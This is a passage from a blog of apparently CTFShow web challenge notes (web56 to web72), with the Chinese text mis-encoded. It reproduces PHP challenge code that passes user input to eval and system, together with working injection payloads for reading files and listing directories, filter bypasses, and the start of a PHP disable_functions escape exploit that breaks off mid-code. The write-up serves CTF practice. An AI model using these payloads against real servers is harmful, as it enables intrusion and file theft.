<h2 id="web56â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ— å­—æ¯æ•°å­—"><a href="#web56â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ— å­—æ¯æ•°å­—" class="headerlink" title="web56â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ— å­—æ¯æ•°å­—"></a>web56â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ— å­—æ¯æ•°å­—</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜ï¼ˆweb55ï¼‰å¤š è¿‡æ»¤äº† $, (, { , &#39;, &#39;â€˜, </p>
<p>å…·ä½“æ–¹æ³•ä¸ä¸Šä¸€é¢˜ï¼ˆweb55ï¼‰ ä¸€æ ·ã€‚</p>
<h2 id="web57â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web57â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web57â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web57â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-08 01:02:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿˜èƒ½ç‚«çš„åŠ¨å—ï¼Ÿ</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>

<p>emmmm</p>
<h2 id="web58â€”â€”æ–‡ä»¶åŒ…å«"><a href="#web58â€”â€”æ–‡ä»¶åŒ…å«" class="headerlink" title="web58â€”â€”æ–‡ä»¶åŒ…å«"></a>web58â€”â€”æ–‡ä»¶åŒ…å«</h2><p>æºç ï¼›</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">c=show_source(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=highlight_file(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="comment">// è¯»å–æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">c=<span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=readfile(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=var_dump(file(<span class="string">&quot;flag.php&quot;</span>));</span><br><span class="line">c=print_r(file(<span class="string">&quot;flag.php&quot;</span>));</span><br><span class="line">c=<span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!feof(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = fgets(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web58.png"></p>
<h2 id="web59â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web59â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web59â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web59â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p><strong>åŒ web58</strong></p>
<h2 id="web60â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web60â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web60â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web60â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p><strong>åŒ web58</strong></p>
<h2 id="web61â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web61â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web61â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web61â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p><strong>åŒ web58</strong></p>
<p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>å¯ä»¥ä½¿ç”¨ </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(<span class="string">&#x27;./&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p> æ‰«æå½“å‰ç›®å½•ä¸‹çš„å†…å®¹:</p>
</li>
</ol>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web61.png"></p>
<ol start="2">
<li><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ web 40 ä¸­ä¸€æ ·çš„æ–¹æ³•:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">c=show_source(array_rand(array_flip(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="web62â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web62â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web62â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web62â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>åŒä¸Š</p>
<h2 id="web63â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web63â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web63â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web63â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>åŒä¸Š</p>
<h2 id="web64â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web64â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web64â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web64â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>åŒä¸Š</p>
<h2 id="web65â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web65â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web65â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web65â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>åŒä¸Š</p>
<h2 id="web66â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web66â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web66â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web66â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">c=highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web66.png"></p>
<p><strong>ç§€ç§€å¾—äº†,è¿™æ¬¡ä¸åœ¨è¿™é‡Œ!</strong>â€˜â€™</p>
<p>æ‰«æå½“å‰ç›®å½•:  æ²¡æœ‰æ­£ç¡®çš„flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=print_r(scandir(<span class="string">&#x27;./&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>æ‰«ææ ¹ç›®å½•: å‘ç° flag.txt</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=print_r(scandir(<span class="string">&#x27;/&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web66_1.png"></p>
<p>æŸ¥çœ‹ æ ¹ç›®å½•ä¸‹çš„ flag.txt:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=highlight_file(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web66_2.png"></p>
<h2 id="web67â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web67â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web67â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web67â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p><strong>åŒ web66</strong></p>
<h2 id="web68â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web68â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web68â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web68â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç :: æ²¡æœ‰æ˜¾ç¤ºæºç å¯èƒ½ç¯å¢ƒåäº†ï¼Œåªæœ‰ä¸€ä¸ªæŠ¥é”™:æ˜¾ç¤º highlight_file() ä¸èƒ½ä½¿ç”¨</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web68.png"></p>
<p>çœ‹äº†å®˜æ–¹æç¤º:ç”¨ include</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="comment">// ä¼šæ˜¾ç¤º è¶…è¿‡äº†å†…å­˜å¤§å°ï¼Œè¯æ˜ index.php æ–‡ä»¶å¤ªå¤§äº†</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web68_1.png"></p>
<p>æ ¹æ®ä¸Šé¢å‡ é“é¢˜çš„ flag çš„ä½ç½®ï¼Œå°è¯• ç›´æ¥ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web68_2.png"></p>
<h2 id="web69â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web69â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web69â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web69â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p><strong>åŒ web68</strong></p>
<h2 id="web70â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web70â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web70â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web70â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p><strong>åŒ web68</strong></p>
<h2 id="web71â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web71â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web71â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web71â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">ä½ è¦ä¸Šå¤©å—ï¼Ÿ</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ob_get_contentx() 	è¿”å›è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹</span></span><br><span class="line"><span class="comment">// ob_start() 			æ‰“å¼€è¾“å‡ºæ§åˆ¶ç¼“å†²</span></span><br><span class="line"><span class="comment">// ob_end_clean() 		æ¸…ç©ºï¼ˆæ“¦é™¤ï¼‰ç¼“å†²åŒºå¹¶å…³é—­è¾“å‡ºç¼“å†²</span></span><br><span class="line"><span class="comment">// æŠŠ æ•°å­—å­—æ¯ éƒ½æ›¿æ¢ä¸ºäº† &#x27;?&#x27;</span></span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜é¦–å…ˆ æ‰§è¡Œ : eval($c),å°†è·å–åˆ°äº†$cæ‰§è¡Œä¸€éï¼Œç„¶å $s = bo_get_contents();å°†$cæ‰§è¡Œçš„å†…å®¹ç”±ç¼“å­˜è¯»å–åˆ°äº†å˜é‡ $s,æ¥ä¸‹æ¥çš„ preg_replace()ä¼šå°†ç¼“å­˜ä¸­çš„æ‰€æœ‰å†…å®¹æ›¿æ¢ä¸ºâ€˜?â€™:å› æ­¤æˆ‘ä»¬å°†ä¼šçœ‹åˆ°å¦‚ä¸‹ï¼š</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web71.png"></p>
<p>å¦‚å›¾æ‰€ç¤ºï¼šæ‰«æç›®å½•å‡ºæ¥çš„ç»“æœéƒ½å˜äº† <strong>??????? and ä½ è¦ä¸Šå¤©å—ï¼Ÿ</strong>,å› æ­¤ä¸å¾—è®© ? æ‰§è¡Œï¼Œé‚£ä¹ˆå¯åœ¨ eval($c)æ‰§è¡Œå®Œæ¯•åå°†æ•´ä¸ªphpç¨‹åºç»™ç»“æŸä¸å†æ‰§è¡Œåé¢çš„è¯­å¥å°±ç»•è¿‡å­—æ¯æ•°å­—çš„æ›¿æ¢:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));<span class="keyword">die</span>();</span><br><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web71_1.png"></p>
<p>å¦‚å›¾æ‰¾åˆ°äº† flag.txt å’Œä¸Šé¢å‡ é“é¢˜çš„ä½ç½®ä¸€æ ·:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web71_2.png"></p>
<h2 id="web72â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web72â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web72â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web72â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç åŒä¸Šä¸€é¢˜: æ­¤é¢˜ä¸ä¼šï¼Œçœ‹äº†ç½‘ä¸Šå¤§ä½¬:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="comment">// DirectoryIterator ç±»æä¾›äº†ä¸€ä¸ªç”¨äºæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç›®å½•å†…å®¹çš„ç®€å•æ¥å£</span></span><br><span class="line"><span class="comment">// ç®€å•çš„è¯´ DirectoryIterator å¯ä»¥è¯»å–ç›®å½•</span></span><br><span class="line"><span class="comment">// glob:// æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼, æ­¤å¤„ /* è¡¨ç¤ºæ ¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶æ‰€ä»¥åœ¨é¢˜ç›®ç¯å¢ƒä¸‹æ‰§è¡Œå°†ä¼šæ˜¾ç¤ºå‡º æ ¹ç›®å½•ä¸‹å­˜åœ¨ flag0.txt æ–‡ä»¶; å½“ç„¶ä¹Ÿå¯ä»¥æ˜¾ç¤ºå…¶ä»–ç›®å½•ä¸­çš„æ–‡ä»¶: /var/* è¡¨ç¤º /varç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web72_1.png"></p>
<p>çœ‹äº†VIPç¾¤é‡Œçš„è„šæœ¬ï¼š 72poc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span 